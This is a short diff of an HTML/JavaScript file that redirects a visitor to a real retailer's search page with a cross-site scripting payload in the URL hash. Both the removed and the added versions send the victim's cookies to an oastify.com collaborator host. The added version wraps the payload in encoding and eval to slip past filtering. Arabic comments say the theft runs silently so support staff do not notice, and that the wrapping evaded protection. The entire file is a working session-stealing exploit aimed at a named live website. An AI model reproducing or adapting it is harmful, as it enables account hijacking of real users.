@@ -1,17 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Redirecting...</title>
-</head>
-<body>
-    <script>
-        // الكود اللي غيسحب الداتا بلا alert باش الـ Support ما يعيق بوالو
-        let exfiltrate = "fetch('https://lg53e95u4k4bmq30cgizvi0bu20towcl.oastify.com/?data='+btoa(document.cookie))";
-        
-        // استعملنا الـ Hash (#) حيت هو اللي لقينا فيه الثقب
-        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=" + exfiltrate + ">";
-        
-        window.location.href = finalTarget;
-    </script>
-</body>
-</html>
+<script>
+    // هادا هو "الساروت" اللي حل ليك الباب
+    let payload = "fetch('https://dvcvt1kmjcj31iisr8xraaf39ufl3mrb.oastify.com/?data='+btoa(document.cookie))";
+    
+    // التغليف اللي هرب من الحماية
+    let encoded = encodeURIComponent(payload);
+    let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
+
+    window.location.href = target;
+</script>
